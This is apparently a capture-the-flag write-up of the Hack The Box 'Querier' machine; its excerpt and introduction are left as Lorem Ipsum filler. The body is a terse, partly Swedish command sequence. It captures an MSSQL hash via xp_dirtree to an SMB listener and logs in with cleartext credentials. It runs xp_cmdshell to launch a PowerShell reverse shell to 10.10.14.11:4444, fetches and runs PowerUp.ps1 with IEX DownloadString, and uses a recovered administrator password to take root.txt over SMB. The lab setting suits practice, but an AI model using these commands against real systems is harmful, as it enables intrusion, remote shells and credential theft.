---
layout: single
title: Querier - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-06-01
classes: wide
header:
  teaser: /assets/images/htb-writeup-querier/querier_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-querier/querier_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


## USER ##
^^^^^^^^^^

LISTENER:
python smbserver.py -smb2support -ip 10.10.14.3 reporting /tmp 

RUN: (för mssql query som ger user/pw)
python mssqlclient.py -windows-auth querier/reporting:PcwTWTHRwryjc\$c6@10.10.10.125
SQL> EXEC master.sys.xp_dirtree '\\10.10.14.3\tmp'

ANSLUT MED RÄTT CREDS:
python mssqlclient.py querier/mssql-svc:corporate568@10.10.10.125 -windows-auth

> xp_cmdshell type C:\Users\mssql-svc\Desktop\user.txt

-----------------------------------------------------------------------------------------
## ROOT ##
^^^^^^^^^^

Starta smbserver samt netcat för PowerShellTCP:
# python smbserver.py -smb2support -ip 10.10.14.11 querier /tmp
# nc -lnvp 4444

ANSLUT SOM MSSQL-SVC:
SQL > xp_cmdshell move \\10.10.14.11\querier\Invoke-PowerShellTcp.ps1 C:\Users\mssql-svc\Desktop\pENIS.ps1
SQL > xp_cmdshell "powershell -file c:\Users\mssql-svc\Desktop\pENIS.ps1 -Reverse -IPAddress 10.10.14.11 -Port 4444"

PS > IEX (New-Object Net.WebClient).DownloadString('\\10.10.14.11\querier\PowerUp.ps1'); Invoke-AllChecks
 [*] Checking for cached Group Policy Preferences .xml files....
 Usernames : {Administrator}
 Passwords : {MyUnclesAreMarioAndLuigi!!1!}

Plocka root:
# python smbclient.py querier/Administrator:MyUnclesAreMarioAndLuigi\!\!1\!@10.10.10.125
# use C$
# cd Users/Administrator/Desktop
# get root.txt
 
